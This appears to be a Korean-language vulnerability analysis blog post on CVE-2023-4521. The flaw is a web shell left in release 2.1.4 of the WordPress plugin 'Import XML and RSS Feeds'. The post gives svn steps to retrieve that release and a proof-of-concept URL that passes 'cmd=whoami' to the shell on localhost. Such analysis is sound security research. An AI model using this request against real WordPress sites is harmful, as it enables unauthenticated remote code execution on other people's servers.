---
title: "[CVE-2023-4521] 취약점 분석 보고서"
description: "Import XML and RSS Feeds에서 웹 쉘을 포함하고 있어, 인증되지 않은 공격자가 원격 코드 실행 가능"
author: bde574786
date: 2024-11-23 11:10:00 +0900
categories: [One-Day 분석, WordPress]
tags: [WordPress, CVE, RCE]
---

<br>
## **1. Description**

CVE-2023-4521은 CVE-2023-4300 취약점 테스트 파일을 삭제하지 않고 출시하였다. 플러그인이나 공급업체가 침해된 것은 아니지만 이전 PoC를 실행한 웹 쉘 파일이 남아있었기 때문에 RCE 취약점이 발생한다.

<br>
## **2. Environment Setting**

CVE-2023-4300의 환경과 같다.

<br>
### **2.1 Affected Version**

- Import XML and RSS Feeds < 2.1.5

일반적으로 Wordpress Plugins 페이지 Advacned 탭에서 플러그인의 이전 버전을 다운로드 할 수 있다.

[Import XML and RSS Feeds](https://wordpress.org/plugins/import-xml-feed/advanced/)

웹 쉘 파일이 남아있었다는 플러그인의 2.1.4 버전의 uploads 경로가 비어있다. 초기 배포 시에는 웹 쉘 파일이 포함되어 있었지만 삭제 후 재배포한 것으로 보인다.

![image.png](assets/posts/one-day/2024-11-23/img-001.png)

<br>
반면, Trac에는 모든 개발 이력과 원본 파일들이 남아있으므로 웹 쉘 파일을 확인할 수 있다.

[Changeset 2958175 – WordPress Plugin Repository](https://plugins.trac.wordpress.org/changeset/2958175/)

![image.png](assets/posts/one-day/2024-11-23/img-002.png)

<br>
웹 쉘 파일이 삭제되었기 때문에 uploads 경로만 리비전 번호가 다르다. 
따라서, 2.1.4 버전이 출시된 시점인 295919로 체크아웃 한다.
![image.png](assets/posts/one-day/2024-11-23/img-003.png)

<br>
파일을 온전히 얻기 위해서는 실시간 바이러스 탐지를 끄거나 방화벽에서 예외를 설정해야 한다.

```bash
svn checkout -r 2954919 https://plugins.svn.wordpress.org/import-xml-feed/tags/2.1.4
```

<br>
일반 사용자에게 배포된 파일과 Trac에서 받은 파일의 해시가 같으므로 동일한 릴리즈임을 확인할 수 있다.

![image.png](assets/posts/one-day/2024-11-23/img-004.png)

<br>
Trac에서 받은 파일을 Wordpress 플러그인으로 설치하려면 파일명은 달라도 되지만 디렉토리 구조와 파일 구성은 동일해야 한다. 
다운로드한 디렉토리를 zip으로 압축하고 Wordpress에 설치한다.
![image.png](assets/posts/one-day/2024-11-23/img-005.png)

<br>
## **3. PoC**

업로드된 웹 쉘 파일을 호출하기만 하면 RCE가 발생한다.

```bash
http://localhost/wordpress/wp-content/plugins/2.1.4/uploads/169227090864de013cac47b.php?cmd=whoami
```

![image.png](assets/posts/one-day/2024-11-23/img-006.png)

<br>
## **4. Discussion**

CVE-2023-4300이 원래 제로데이 취약점으로 존재했고, 이후 패치 과정에서 PoC 테스트 파일을 통해 취약점이 알려지며 원데이 취약점으로 변경되었다. 하지만 패치 릴리즈 중 실수로 웹 쉘 파일이 포함된 상태로 배포되면서, CVE-2023-4521로 새로운 제로데이 취약점이 발생하였다.

CVE-2023-4300은 관리자 권한이 있는 사용자를 전제로 한 취약점이었기 때문에 CVSS 점수가 상대적으로 낮게 평가되었다. 반면, CVE-2023-4521은 인증 없이 누구나 낮은 난이도로 RCE 공격을 시도할 수 있는 상태가 되어 CVSS 점수가 높게 평가되었고, 취약점의 심각성도 Critical 수준으로 지정된 것으로 보인다.